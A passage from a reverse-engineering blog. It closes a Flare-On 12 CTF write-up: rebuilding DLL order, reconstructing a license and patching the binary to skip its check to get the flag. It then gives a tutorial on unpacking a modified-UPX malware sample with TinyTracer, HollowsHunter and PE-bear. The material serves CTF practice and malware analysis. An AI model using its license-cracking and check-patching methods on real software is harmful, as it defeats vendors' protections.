I decided to divide the task of parsing into two stages.

## Dumping arguments of the “f” functions

In the first stage, I refactored the `disasm-cli`, and made a version optimized for this task only. It is available [here](https://github.com/hasherezade/flareon2025/blob/main/task9/disasm-cli/main.cpp).

Instead of loading a single DLL at the time, and dumping a single function, it walks through a directory, and loads sequentially DLLs that match the pattern of the numeric names, in the defined range. Then, once it loaded the DLL, it walks through all the exports from the given DLL, and filters out all the entries that don’t match the pattern of the “f” function name. Now we can focus on extracting the needed arguments from the “f” function, as well as its type.

Since the functions of each type has distinct length, we can guess the type simply by looking how many lines of disassembly they produce. This is how I implemented the type recognition:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10 | `int``get_func_type(``size_t``count)`<br>`{`<br>```if``(count == 172 || count == 173)`<br>```return``1;`<br>```if``(count == 98 || count == 99)`<br>```return``2;`<br>```if``(count == 56 || count == 57)`<br>```return``3;`<br>```return``0;`<br>`}` |

The arguments are always loaded by `"movabs"` and they are always put in a known order. Example:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10 | `; 0000.dll._Z21f38236877289593244403Ph`<br>`[...]`<br>`22415f6a9 : mov byte ptr [rax], dl`<br>`22415f6ab : movabs rax, 0x22f130e6fafe934b`<br>`22415f6b5 : movabs rdx, 0x777fd23eb0b83b25`<br>`22415f6bf : mov qword ptr [rbp - 0x60], rax`<br>`22415f6c3 : mov qword ptr [rbp - 0x58], rdx`<br>`22415f6c7 : movabs rax, 0xf605c9124bc28c77`<br>`22415f6d1 : movabs rdx, 0x59263089104bc46b`<br>`[...]` |

So once we have the “f” function’s start and end, we can simply parse all the movabs lines and store their values.

The cli program produces CSV files, logging arguments of all the found “f” functions from all the parsed DLLs.

Format:

```
dll_name,func_name,func_type,[ arg0 arg1 ...]
```

Example of the output:

|     |     |
| --- | --- |
| 1<br>2<br>3 | `0000.dll,_Z21f92961177136248183669Ph,1,[ 0x4424e37bb62cc35f 0xc1bc82578497fd19 0xd183214321ad80c1 0xfb1788c5e6d0b56e ]`<br>`0000.dll,_Z21f47243230667592677056Ph,2,[ 0xa0d8041e1fd3377a 0xc77ea7007b565897 0x149a47dfd54ef22d 0xc3fa2520f95a59f 0x95f77b9a8db2a26 0x6baebf39803325a3 0x538719f9d1f5af8a 0x2710983692826288 0x914184e8b76f05c2 0x6915cfc4f0c9900a 0xe075bdac8b3bb383 0xf186de7307ff1724 0x8cf47dc6a1b29c4f 0xd22b504d3d9dbb21 0x5cd7cafb302e641d 0xc8ad893c79205e48 0xb6ef599b40fa43dc 0x6ec0b4b44c37813 0x66816c605a18d649 0x168d8e961c8522e4 0x93354ad401e1fe9e 0x1a724cdde3f6b52c 0xcc236acdc1ab1b94 0x707faafdb0ed7165 0xbae93ae629f36367 0xe245a612618fea08 0x5d340338f776fc31 0x68a955d9dabcb4ce 0xebd054be0d99f8c0 0xb1ee4232b82fcb74 0x5b116e7ca40ee751 0x3ee56d465702c528 ]`<br>`[...]` |

Those results will be then loaded to the next parser, that will reconstruct all the input needed to reverse a single “check” per DLL.

## Dumping arguments per DLL

The real goal to achieve in this part is to dump all the arguments that will let us solve a single chunk. That means. we will walk thought the set of DLLs, parse the “check” function of each DLL, and reconstruct the data needed to resolve it, including:

1. An ordered list of “f” functions, along with the arguments of each, and along with the ID of the DLL where the function comes from (the DLL ID is the same as the offset of the value in `g_Buf1` with which the first DWORD of the chunk is XOR-ed at the beginning of the “f” function).
2. All the arguments used for the second part of the “check”. That means the definition of the matrix, e, and P, that will be used to its exponentiation, as well as the result that is expected. At this point we can also do the matrix inverse, and pre-calculate the content of the buffer that was expected at the beginning of this part (incorporating [the script created earlier](https://github.com/hasherezade/flareon2025/tree/main/task9/scripts)).

The previously generated CSV files with arguments mapped per particular “f” function will be used as lookup tables in the first part of the resolution.

For the convenience of parsing, I decided to first convert the CSV file into a pickle format. The used script is available [here](https://github.com/hasherezade/flareon2025/blob/main/task9/disasm_wrapper/parse_func_args.py). This parsing transforms the simple list (where each line represents as single “f” function along with its list of arguments) into a mapping of objects.

|     |     |
| --- | --- |
| 1<br>2<br>3 | `rec = parse_line(line)`<br>`key = f"{rec.dll}.{rec.func}"`<br>`mapping[key] = rec` |

The generated pickle file is then use in a new script, that resolves the “check”.

The second script makes use of the original `disasm-cli` utility from the [beardisasm](https://github.com/hasherezade/beardisasm) repository. Since we are interested in disassembling one function at the time, the basic functionality will be sufficient, and we don’t have to extend it. The Python script will be a wrapper calling the original executable whenever the disassembly is needed.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31 | `def``dump_check(dll_name, fmapping, out_dir):`<br>```func_name``=``"_Z5checkPh"`<br>```wrapper``=``DisasmCLIWrapper(DISASM_PATH)`<br>```lines``=``wrapper.disasm(DLLS_PATH``+``dll_name, func_name)`<br>```values``=``extract_values(lines)`<br>```cfunc``=``CheckFuncWrapper(dll_name, values)`<br>```cfunc.solve()`<br>``<br>```raw_func_list``=``extract_dll_and_func(lines)`<br>```for``dll_func``in``raw_func_list:`<br>```if``not``dll_func``in``fmapping.keys():`<br>```print``(f``"Function not found: {dll_func})"``)`<br>```dll, func``=``dll_func.split(``".dll."``,``1``)`<br>```# fail-safe: resolve if not found:`<br>```dump_func(dll``+``".dll"``, func, cfunc.funcs_list)`<br>```continue`<br>```rec``=``fmapping[dll_func]`<br>```cfunc.funcs_list.append(rec)`<br>```out_file``=``out_dir``+``"//"``+``dll_name``+``".resolved.txt"`<br>```pkl_file``=``out_dir``+``"//"``+``dll_name``+``".pkl"`<br>```save_cfunc_as_pickle(cfunc, pkl_file)`<br>``<br>```with``open``(out_file,``"w"``, encoding``=``"utf-8"``) as f:`<br>```m0_hex``=``[f``"0x{v:x}"``for``v``in``cfunc.m0]`<br>```f.write(f``"Precalculated: {m0_hex}\n"``)`<br>```for``func``in``cfunc.funcs_list:`<br>```f.write(f``"{func}\n"``)`<br>```print``(f``"{dll_name} -> {m0_hex}"``)` |

The implementation contains also a fail-safe option, to cover the possibility if some “f” function was not found in the previously loaded lookup. In such case, the script will call [the basic `disasm-cli` tool](https://github.com/hasherezade/beardisasm/tree/master/disasm-cli) to dump this function from the specific DLL, and parse to the same format as it was used by the original lookup:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8 | `def``dump_func(dll_name, func_name, funcs_list):``#0000.dll`<br>```wrapper``=``DisasmCLIWrapper(DISASM_PATH)``# or just "disasm-cli" if on PATH`<br>```lines``=``wrapper.disasm(DLLS_PATH``+``dll_name, func_name)`<br>```ff``=``FFuncWrapper(dll_name, func_name, get_func_type(lines), extract_int_values(lines))`<br>```funcs_list.append(ff)`<br>```print``(ff)`<br>```if``ff.``type``=``=``None``:`<br>```print``(``"WARNING: %s : %d"``%``(func_name,``len``(lines)))` |

As a result, we get a completed report, one per DLL, that has all the data required to resolve the relevant chunk. Preview (`0000.dll_listing.txt`):

|     |     |
| --- | --- |
| 1<br>2<br>3 | `Precalculated: ['0x5a4e7d2f5af00585', '0x73e25c25e161d3e6', '0x57c73d52ba18cb4', '0x47ae048873095840']`<br>`CheckFuncWrapper(dll=0000.dll, p=0xdc37c0e304978087, e=0x594b7f91f11228e5, xor=['0x264f1c2a310e43aa', '0x6f62577ddb8f7c8', '0x2f5eef5c62186c64', '0x3b278b1ea0e08e88', '0x30b6b0678e48aee', '0x5857a70651b71bd1', '0x11328681bbf8806a', '0x46a52df6f08b2685', '0x5b5746a4910ca7fd', '0x4fce2f265662e21', '0x32a013dc0e0f538a', '0xfffec7ae2c6f8f79', '0x3b0ad6e24be21f00', '0xd285721394b26b6f', '0x49ff24112a0c1a2e', '0xf3a55fbbc4837e78'], m0=['0x5a4e7d2f5af00585', '0x73e25c25e161d3e6', '0x57c73d52ba18cb4', '0x47ae048873095840'], m1=['0x7c0161056bfe462f', '0x751479523cd9242e', '0x2a229c8949b9e0d0', '0x7c898f96d3e9d6c8', '0x5945162922148f6b', '0x2bb5fb23b0d6c837', '0x144ef55490590cde', '0x10b297e83827ec5', '0x1193b8bcbfca278', '0x771ebed78407fdc7', '0x37dc600925aedf3e', '0xb850c3265f66d739', '0x6144abcd11121a85', '0xa1672e3675d3b889', '0x4c8357c401ad969a', '0xb40b5b33b78a2638'], m2=['0x65de31ef76b34c5e', '0xbf9224aa780960ba', '0x944c61fe664d8a46', '0x85ffaacd31f816d1', '0x5fe739de69b61b49', '0x4362ab9dfd8274e5', '0xc90b9e6ac29a84ec', '0x661807122a7615d7', '0x2367a1bf2b936d7c', '0x289e160527983def', '0xb0e4b274464c4bfd', '0x5222046dfef7b826', '0x6158769ed8530622', '0x56eabd584b51a70', '0xa5b7c08151fface8', '0xc7b8d0a6d71a6e00'])`<br>`[...]` |

Link to the full report [here](https://gist.github.com/hasherezade/0a5ce5957ce863b7188383c88ee2a4c7).

This report will be loaded in another tool, that will finally help us regenerate the full license. But still one thing is missing to reconstruct the chunk. As mentioned earlier, at the beginning of each “f” function, there is an additional XOR with a DWORD. That DWORD comes from the global buffer (`DWORD xor_key = g_Buf1`\[DLL\_id\]). The problem is, the value of `g_Buf1` changes on each iteration of the loop that verifies chunks. And the way in which it changes depends on the DLL order. This leads us to another problem of this task: figuring out the proper order.

# Reconstructing DLLs order

In the part **_“The role of Global Buffer (g\_Buf1)”_** I described how on each iteration of the chunk verification loop, the shared global buffer is updated. The list of all the manually loaded DLLs that are present at current point, is iterated over (that means: the DLL immediately assigned to check the sample, plus its direct and indirect dependencies). Indexes of those DLLs point a specific DWORD in the g\_Buf1 where the index of the current iteration will be added.

That’s why, to really map all the positions that changed when the particular DLL was used, we first need to have a complete list of dependencies for each DLL.

## Mapping dependencies

To map those recursive dependencies, I used a simple tool based on [libPEConv](https://github.com/hasherezade/libpeconv/) (the full code is [here](https://github.com/hasherezade/flareon2025/blob/main/task9/dependencies/deps/main.cpp)). One of the basic features of [libPEConv](https://github.com/hasherezade/libpeconv/) is its ability to define a custom DLL resolver. For the current task, I created the following one:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18 | `class``my_func_resolver : peconv::t_function_resolver{`<br>`public``:`<br>```my_func_resolver(dll_deps& _my_deps)`<br>```: my_deps(_my_deps)`<br>```{`<br>```}`<br>```FARPROC resolve_func(``LPCSTR``lib_name,``LPCSTR``func_name)`<br>```{`<br>```WORD``num = (-1);`<br>```if``(!getDllId(lib_name, num)) {`<br>```return``nullptr``;`<br>```}`<br>```if``(!isNumericDLL(lib_name))``return``nullptr``;`<br>```my_deps.deps.insert(num);`<br>```}`<br>```dll_deps& my_deps;`<br>`};` |

This resolver is plugged into the custom PE loading function implemented in libPEConv. Loading one DLL will cause a mapping of its immediate imports.

Once we have such mapping for each of the 10000 DLLs, we can recursively populate it. So, for example if the DLL 1 imports 2,7,9 as immediate imports, we will include to its final list of imports also the imports of 2,7,9, and so on (of course not allowing duplicates) – till we collect the complete list.

## Reconstructing the DLL order

Even having the full DLL dependency mapping, reconstructing the order is still not so straight-forward. We know which positions have the index added when the DLL is loaded – but how can it help?

The key to solve it lies in the observation, that there are some DLLs in the set that have been loaded exactly once during the whole execution. That means, at their corresponding position in the g\_Buf1 there is the actual index of the iteration where this DLL was used (and not a sum of multiple indexes).

The following listing shows the DLLs that are not dependencies of any:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24 | `DLL: 675 : 0`<br>`DLL: 788 : 0`<br>`DLL: 933 : 0`<br>`DLL: 1657 : 0`<br>`DLL: 1678 : 0`<br>`DLL: 2016 : 0`<br>`DLL: 2356 : 0`<br>`DLL: 2704 : 0`<br>`DLL: 2735 : 0`<br>`DLL: 2861 : 0`<br>`DLL: 2921 : 0`<br>`DLL: 3214 : 0`<br>`DLL: 3927 : 0`<br>`DLL: 5046 : 0`<br>`DLL: 6115 : 0`<br>`DLL: 6547 : 0`<br>`DLL: 6976 : 0`<br>`DLL: 7041 : 0`<br>`DLL: 7326 : 0`<br>`DLL: 7982 : 0`<br>`DLL: 8373 : 0`<br>`DLL: 8470 : 0`<br>`DLL: 9888 : 0`<br>`Counter: 23` |

The final stage of the g\_Buf1 is saved in the hard-coded buffer, that I denoted as Validation Buffer. That means, we can retrieve those indexes from there.

The above listing with the DLL position appended:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24 | `DLL: 675 : 0 pos: 738`<br>`DLL: 788 : 0 pos: 498`<br>`DLL: 933 : 0 pos: 3302`<br>`DLL: 1657 : 0 pos: 2222`<br>`DLL: 1678 : 0 pos: 1539`<br>`DLL: 2016 : 0 pos: 5736`<br>`DLL: 2356 : 0 pos: 4567`<br>`DLL: 2704 : 0 pos: 3882`<br>`DLL: 2735 : 0 pos: 8186`<br>`DLL: 2861 : 0 pos: 3606`<br>`DLL: 2921 : 0 pos: 6060`<br>`DLL: 3214 : 0 pos: 9696`<br>`DLL: 3927 : 0 pos: 608`<br>`DLL: 5046 : 0 pos: 2383`<br>`DLL: 6115 : 0 pos: 5903`<br>`DLL: 6547 : 0 pos: 3890`<br>`DLL: 6976 : 0 pos: 1842`<br>`DLL: 7041 : 0 pos: 1817`<br>`DLL: 7326 : 0 pos: 1007`<br>`DLL: 7982 : 0 pos: 1301`<br>`DLL: 8373 : 0 pos: 4892`<br>`DLL: 8470 : 0 pos: 5365`<br>`DLL: 9888 : 0 pos: 4732`<br>`Counter: 23` |

Those DLLs are not dependencies of any other – so they have been loaded only once. However, during their load, their dependencies has been loaded. That means, at the index in g\_Buf1, that represents each of their dependencies, there is a value representing: `previous_sum + current_index` .

If we subtract the current\_index from the appropriate records in the Validation Buffer, what remains is the previous\_sum. And in some cases, the previous\_sum is just one value (if the DLL represented by it was not a dependency of any BUT the last processed DLL). So, we can repeat the whole subtraction method recursively, in each round obtaining more load indexes.

The program reconstructing the complete order is available [here](https://github.com/hasherezade/flareon2025/blob/main/task9/dll_order/main.cpp).

The listing showing the recovered order is available [here](https://github.com/hasherezade/flareon2025/blob/main/task9/resolved_order.txt).

# Reconstructing the license

At this point, we have all the ingredients to prepare the correct license.

1. Arguments to reverse the “check”:
   - full sequence of the “f” functions, their arguments, and the output they produced (that we obtained by calculating the inverse of the matrix from the final comparison).
   - the order of the DLLs that allow us to reconstruct the content of the g\_Buf1 at the point where the DLL was loaded, and therefore, the correct XOR value.
2. The inverted version of each “f” function

The full program recreating the license based on the supplied data is available [here](https://github.com/hasherezade/flareon2025/blob/main/task9/operations/main.cpp).

The beginning of the valid license demonstrated here:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/lic_bgn.png?w=632)

The full file can be [found in the repository](https://github.com/hasherezade/flareon2025/blob/main/task9/license.bin).

# Decrypting the flag

I decided the simplest way to decrypt the flag would be by using the original executable. However, we will skip the part that does the license verification, since it takes too much time.

I loaded the original executable in X64dbg, and simply patched it to jump over the part of code responsible for checking each chunk in the loop.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/jump_over.png?w=988)

I earlier checked some chunks individually using my custom loader, so at this point I am quite confident that the obtained file is valid.

I allowed the original program to calculate the SHA256 of the file, and then to use it as an AES key, to decrypt the buffer. This is how I’ve got the final flag!

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/11/flag_disp.png?w=972)

|     |     |
| --- | --- |
| 1 | `"Its_l1ke_10000_spooO0o0O0oOo0o0O0O0OoOoOOO00o0o0Ooons@flare-on.com"` |

Posted in [CrackMe](https://hshrzd.wordpress.com/category/crackme/), [CTF](https://hshrzd.wordpress.com/category/ctf/), [FlareOn](https://hshrzd.wordpress.com/category/ctf/flareon/)\|Tagged [FlareOn](https://hshrzd.wordpress.com/tag/flareon/), [FlareOn12](https://hshrzd.wordpress.com/tag/flareon12/)\|[2 Comments](https://hshrzd.wordpress.com/2025/11/20/flare-on-12-task-9/#comments)

## [Tutorial: unpacking executables with TinyTracer + PE-sieve](https://hshrzd.wordpress.com/2025/03/22/unpacking-executables-with-tinytracer-pe-sieve/)

Posted on [March 22, 2025](https://hshrzd.wordpress.com/2025/03/22/unpacking-executables-with-tinytracer-pe-sieve/ "8:43 pm") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

_Covers: automatic OEP finding, reconstructing IAT, avoiding antidebugs and fixing imports broken by shims_

In this short blog I would like to demonstrate you how to unpack an executable with [PE-sieve](https://github.com/hasherezade/pe-sieve/) and [Tiny Tracer](https://github.com/hasherezade/tiny_tracer/). As an example, let’s use the executable that was packed with a modified UPX:

- [8f661f16c87169fefc4dc7e612521ad8498c016a0153c51dae67af0b984adaac](https://malshare.com/sample.php?action=detail&hash=8f661f16c87169fefc4dc7e612521ad8498c016a0153c51dae67af0b984adaac)

Usually, when dealing with UPX-packed cases, we can use the original [original UPX executable](https://upx.github.io/) to unpack it. But since it is a modified version, it was not possible:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10 | `./upx -d ~/packed.exe`<br>```Ultimate Packer for eXecutables`<br>```Copyright (C) 1996 - 2020`<br>`UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020`<br>```File size         Ratio      Format      Name`<br>```--------------------   ------   -----------   -----------`<br>`upx: /home/tester/packed.exe: CantUnpackException: file is modified/hacked/protected; take care!!!`<br>`Unpacked 0 files.` |

The most known way to tackle such cases is by using [x64dbg](https://x64dbg.com/) and [Scylla](https://github.com/NtQuery/Scylla). The classic pathway was described many years ago in the [series of tutorials “Unpacking with Antracene”](https://forum.tuts4you.com/files/file/2040-unpacking-with-anthracene/) \[1\]. This method requires opening the main executable under the debugger, setting appropriate breakpoints, and following the execution till it hits the Original Entry Point (OEP). After we found the OEP, we dump the unpacked version of the PE from memory, then fix the dump by searching and reconstructing the IAT. The details of what breakpoints to set, and how the execution should be followed, depend on the specific packer. In some cases, the stub may contain some anti-debug measures that have to be defeated additionally.

Here I will demonstrate how the similar effect can be achieved with the help of my tools. This alternative way is more generic, and does not depend on the details of the stub implementation. We can also avoid using a debugger altogether, and not be bothered by any additional inconveniences created by evasion techniques. For the dumping purpose, we use [PE-sieve with `/imp` argument](https://github.com/hasherezade/pe-sieve/wiki/4.3.-Import-table-reconstruction-(imp)), that automatically finds the new IAT and reconstruct the import table.

To keep this demo simple, I have chosen an example of a custom UPX. But this method of unpacking can work well for variety of packers: as long as we are dealing with the classic type, that involve use of a single unpacking stub. It won’t produce complete and runnable results when packers using virtualization were applied (i.e. [VMProtect](https://vmpsoft.com/vmprotect/overview/), Themida, etc) – yet, even then, it can help us obtain a useful material for static analysis.

## Used tools

- [PE-bear](https://github.com/hasherezade/pe-bear) – for PE overview, and modification
- [TinyTracer](https://github.com/hasherezade/tiny_tracer) – for tracing
- [HollowsHunter](https://github.com/hasherezade/hollows_hunter) (or [PE-sieve](https://github.com/hasherezade/pe-sieve)) – for dumping and Import Table reconstruction

## Overview of the sample (PE-bear)

Let’s start by opening the sample in [PE-bear](https://github.com/hasherezade/pe-bear/), to have a brief overview.

The first thing that stands out is that our PE has sections with atypical names. There are two sections created by the packer: “0000” and “1111”. The execution starts in the second one, “1111”. So, we can suspect that this is where the unpacking stub is located.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/section_1.png?w=669)

The first section, “0000” has the executable characteristics set, but it is empty in the file (notice the `Raw size: 0`). We can predict that this is where the original code will be filled in.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/sections.png?w=778)

Moving on to look at different headers, we can see that the sample is compiled for an old version of Windows: XP.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/win_xp.png?w=459)

This can cause some problems further on in the unpacking process. Oftentimes, on modern Windows, the executables compiled for old versions are run with [compatibility shims](https://techcommunity.microsoft.com/blog/askperf/demystifying-shims---or---using-the-app-compat-toolkit-to-make-your-old-stuff-wo/374947) applied. This can corrupt the process of dumping imports (see more details [here](https://hshrzd.wordpress.com/2019/06/27/application-shimming-vs-import-table-recovery/)).

## Running the sample via Pin (TinyTracer)

First, we will run our sample under the control of the Dynamic Binary Instrumentation platform, [Intel PIN](https://www.intel.com/content/www/us/en/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html). As a tracing tool, we will use [TinyTracer](https://github.com/hasherezade/tiny_tracer/) . You can find the detailed [installation instructions on Wiki](https://github.com/hasherezade/tiny_tracer/wiki/Installation).

Running a sample via TinyTracer gives several benefits:

- It produces a tracelog that can help us pinpoint the Original Entry Point of the sample very quickly
- Intel PIN is not a debugger, so it won’t be affected by most of the antidebug checks that the packer’s stub may contain (a good explanation provided [here](https://youtu.be/1-q7LaNhGVM?t=768)). Additionally, TinyTracer allows to [bypass multiple AntiVm and AntiDebug checks](https://github.com/hasherezade/tiny_tracer/wiki/The-INI-file#antidebug).
- By tracing an executable via Pin we can easily check if any of the APIs are run with the compatibility shims applied. It helps us prevent the problems with dumping of the import table, that were mentioned earlier ( [shims may interfere with it, making the reconstruction harder](https://hshrzd.wordpress.com/2019/06/27/application-shimming-vs-import-table-recovery/)).
- It lets us pause the execution at the given offset (without a need to set a breakpoint in a debugger)

So, let’s start by tracing the executable with Tiny Tracer (the full produced tracelog is available [here](https://gist.github.com/hasherezade/eb09bd747208c2aee9b281d5ed6e66b2)).

### Preventing the compatibility shims

By having a complete tracelog we can first see if any of the functions have been called via [compatibility shims](https://reactos.org/wiki/User:Learn_more/Appcompat). We can recognize them as the calls done via `apphelp` module. For example, this fragment of the tracelog contains shims:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8 | `[...]`<br>`1307c;apphelp.[SE_GetProcAddressForCaller+710]*`<br>`12cb4;apphelp.[SdbGetNthUserSdb+2e0]*`<br>`132f4;apphelp.[SE_GetProcAddressForCaller+620]*`<br>`1307c;apphelp.[SE_GetProcAddressForCaller+710]*`<br>`12cb4;apphelp.[SdbGetNthUserSdb+2e0]*`<br>`132f4;apphelp.[SE_GetProcAddressForCaller+620]*`<br>`12bfc;apphelp.[SdbFindNextStringIndexedTag+4d0]*` |

We can try to prevent it by changing the OS Version in the Optional Header, as described in [the related blog](https://hshrzd.wordpress.com/2019/06/27/application-shimming-vs-import-table-recovery/). In case of the currently analyzed application, I changed the OS to Windows 10 (0xA):

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/os_change.png?w=447)

We can see that the bypass was successful when the functions called at the same offsets are finally referenced by their original DLLs:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8 | `[...]`<br>`1307c;user32.GetDC`<br>`12cb4;gdi32.GetDeviceCaps`<br>`132f4;user32.ReleaseDC`<br>`1307c;user32.GetDC`<br>`12cb4;gdi32.GetDeviceCaps`<br>`132f4;user32.ReleaseDC`<br>`12bfc;gdi32.CreatePalette` |

If we have a bad luck, we may encounter a sample that won’t load correctly without the compatibility shims, and then to bypass them we are forced to execute it on the dedicated version of Windows, and dump from there.

### Pinpointing the Original Entry Point (OEP)

As we know, in order to unpack the application, we need to find its OEP (this concept has been described many times in classic tutorials, i.e. \[1\]). It is the best point to dump the application. The unpacking stub finished its execution, and the original code is ready in memory, but didn’t execute yet. Locating the OEP is very easy when we have a tracelog.

What we concluded from the overview, the section “0000” is where the original code is going to be uncompressed to. So, the first address in this section that is hit will be our Original Entry Point.

Searching for the transitions between the stub section, and the newly unpacked code section, is a general rule that we can apply for the classic type of packers. In case of more complex packers, there may be multiple back and forth jumps between sections. Usually we should focus on the last one. To be extra sure that we are at the point where the original code got unpacked, we can also look for some other patterns in the tracelog. It is very common that the Import Table of the packed application is also compressed or otherwise destroyed, and it has to be manually loaded in memory by the unpacking stub. So, when we see in the log a lot of calls of the import loading functions (`LoadLibrary` \+ `GetProcAddress` or their low-level equivalents), this is where those preparations happens.

Fragment of the tracelog:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21 | `[...]`<br>`44c3e7;kernel32.GetProcAddress`<br>`GetProcAddress:`<br>```Arg[0] = ptr 0x72980000 -> {MZ\x90\x00\x03\x00\x00\x00}`<br>```Arg[1] = ptr 0x0084b15b -> "ClosePrinter"`<br>`44c3d2;kernel32.LoadLibraryA`<br>`LoadLibraryA:`<br>```Arg[0] = ptr 0x008a7ed4 -> "winspool.drv"`<br>`44c3e7;kernel32.GetProcAddress`<br>`GetProcAddress:`<br>```Arg[0] = ptr 0x72980000 -> {MZ\x90\x00\x03\x00\x00\x00}`<br>```Arg[1] = ptr 0x0084b172 -> "GetDefaultPrinterW"`<br>`44c415;kernel32.VirtualProtect`<br>`44c42a;kernel32.VirtualProtect`<br>`44c43b;[1111] -> [0000]`<br>`1d14b0;section: [0000]`<br>`e538;kernel32.GetModuleHandleW`<br>`4d84;kernel32.SetThreadLocale` |

Seeing this tracelog, especially the sections transition at:

|     |     |
| --- | --- |
| 1<br>2 | `44c43b;[1111] -> [0000]`<br>`1d14b0;section: [0000]` |

-we can conclude with a high confidence that the OEP is at the RVA = 0x1d14b0 (the first address in the newly unpacked section, “0000”, that was hit). So this is where we need to set a breakpoint (or a [pseudo-breakpoint in case of TinyTracer](https://github.com/hasherezade/tiny_tracer/wiki/Stop-offsets)) in order to dump valid, unpacked binary.

### Setting the stop offset

Having the Original Entry Point noted from the first tracing session, we can run the sample once again, this time pausing at this particular point, so that we can dump the unpacked sample.

In order to pause the execution at the offset, we can use a classic debugger, i.e. [x64dbg](https://x64dbg.com/). But in some cases, the stub may be sprinkled with antidebug techniques, that will cause additional problems, and i.e. make the sample exit prematurely.

Those problems will not occur while running the sample via PIN tracer, since PIN is not a debugger and can’t be detected in the same ways. But PIN does not allow for setting breakpoints… Still we can emulate the breakpoint behavior. In TinyTracer, there is a possibility to define stop offsets. The details are described at TinyTracer’s Wiki \[ [here](https://github.com/hasherezade/tiny_tracer/wiki/Stop-offsets)\].

We just write down the stop RVA into the `stop_offsets.txt` file in the TinyTracer’s installation directory. By default, the execution will pause at the defined offset for 30 seconds. If it is not enough to dump the sample, we can increase this time by changing the relevant settings in [TinyTracer.ini](https://github.com/hasherezade/tiny_tracer/wiki/The-INI-file). When the execution has paused, we will see an information about it in the tracelog (we can preview it in real time using [baretail](https://www.baremetalsoft.com/baretail/) tool).

## Dumping the sample (with PE-sieve/HollowsHunter)

For this part we gonna use PE-sieve’s wrapper, [HollowsHunter](https://github.com/hasherezade/hollows_hunter). It has [all the features of PE-sieve](https://github.com/hasherezade/pe-sieve/wiki), plus additional ones, i.e. it allows to scan the process selected by the name (not just by the PID).

There are [some subtle differences](https://github.com/hasherezade/pe-sieve/wiki/1.-FAQ#pe-sieve-vs-hollowshunter---what-is-the-difference) between the default options that are set in both. For example, by default, PE-sieve scans for hooks and patches in the loaded modules, while with HollowsHunter you have to request it manually, using the argument `/hooks`. In the currently analyzed case, we are dealing with a packed executable, that overwrites one of its section, and fills it with a new content, so it is a form of binary patching. That’s why, in order to have it detected by the scan, we have to enable the “hooks” option in Hollows Hunter.

Another important option that should be set is [import reconstruction (enabled with `/imp`)](https://github.com/hasherezade/pe-sieve/wiki/4.3.-Import-table-reconstruction-(imp)). We will be sufficient with an automatic mode of import recovery, enabled by `/imp A`.

The full commandline required to do the dump:

|     |     |
| --- | --- |
| 1 | `hollows_hunter.exe /pname packed.exe /hooks /imp A` |

The only thing we need to ensure is that the dump was made at the exact moment when the Pin Tracer paused at the Original Entry Point.

While running the sample via Tiny Tracer, and watching the tracelog via Baretail, we should see the following entry:

|     |     |
| --- | --- |
| 1<br>2 | `1d14b0;section: [0000]`<br>`# Stop offset reached: RVA = 0x1d14b0. Sleeping 60 s.` |

This is the moment to scan the process with Hollows Hunter. We should get the dumped saved to the dedicated directory.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/dump_it.png?w=902)

## Final tweaks – changing the Entry Point (with PE-bear)

While the unpacked binary is dumped, we still need to postprocess it a bit before it becomes runnable.

To do:

- changing the Entry Point
- changing the sections characteristics

First of all, the dumped binary still has the previous Entry Point saved in its headers – leading to the stub, rather than to the unpacked section. We can change it quickly just by opening the dumped executable with PE-bear and editing the value in the Optional Header:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/opt_hdr.png?w=453)

An alternative way to do it is by jumping to that RVA:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/go_to_rva.png?w=283)

Then, in the disasm view, we can select it as a new Entry Point.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/set_ep.png?w=460)

Yet, if we save the modified executable, and try to run it, we encounter an error:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/unable_to_start.png?w=409)

The reason if it can be guessed if we look again at the sections characteristics of the dump:

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/sections_changed.png?w=622)

As we can see, they have been modified in memory. In the original executable each of the sections had rwx characteristic. We can copy those characteristics from the initial sample, and change them back in our dumped executable.

![](https://hshrzd.wordpress.com/wp-content/uploads/2025/02/new_access.png?w=624)

After those few tweaks, all runs fine, and we can finally enjoy our unpacked executable!

## References

